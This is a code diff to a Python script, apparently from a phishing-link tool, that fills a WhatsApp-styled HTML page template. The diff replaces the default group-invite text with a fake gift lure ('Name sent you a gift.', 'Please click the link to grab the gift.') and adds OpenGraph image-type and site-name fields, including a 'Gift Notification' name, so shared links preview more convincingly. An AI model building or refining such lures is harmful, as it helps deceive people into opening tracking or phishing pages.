@@ -19,7 +19,7 @@ if not title:
     except Exception:
         title = ''
 if not title:
-    title = 'WhatsApp Group Invite'
+    title = 'Name sent you a gift.'
 utils.print(f'{G}[+] {C}Group Title :{W} ' + title)
 
 if not desc:
@@ -28,16 +28,16 @@ if not desc:
     except Exception:
         desc = ''
 if not desc:
-    desc = 'WhatsApp Group Invite'
+    desc = 'Please click the link to grab the gift.'
 utils.print(f'{G}[+] {C}Description :{W} ' + desc)
 
 if not image:
     try:
-        image = input(f'{G}[+] {C}Path to Group Img (Best Size : 300x300): {W}')
+        image = input(f'{G}[+] {C}Path to Group Img (Best Size : 1200x630): {W}')
     except Exception:
         image = ''
 if not image:
-    image = 'template/whatsapp/images/ZIvBTrQd9nP.png'
+    image = 'https://images.unsplash.com/photo-1549465220-1a8b9238cd48?w=1200&h=630&fit=crop'
 utils.print(f'{G}[+] {C}Group Image :{W} ' + image)
 
 img_name = None
@@ -63,6 +63,9 @@ if image.startswith('http'):
 else:
     og_image = f'https://seeker.riocut.com/images/{img_name}'
 
+img_type = 'image/png' if ((img_name and img_name.lower().endswith('.png')) or image.lower().endswith('.png')) else 'image/jpeg'
+site_name = os.getenv('SITENAME') or ('Gift Notification' if 'gift' in title.lower() else 'Direct Share')
+
 with open('template/whatsapp/index_temp.html', 'r') as index_temp:
     code = index_temp.read()
     if os.getenv("DEBUG_HTTP"):
@@ -70,6 +73,8 @@ with open('template/whatsapp/index_temp.html', 'r') as index_temp:
     code = code.replace('$TITLE$', title)
     code = code.replace('$DESC$', desc)
     code = code.replace('$OG_IMAGE$', og_image)
+    code = code.replace('$OG_IMAGE_TYPE$', img_type)
+    code = code.replace('$SITE_NAME$', site_name)
     code = code.replace('$IMAGE$', 'images/{}'.format(img_name))
 
 with open('template/whatsapp/index.html', 'w') as new_index:
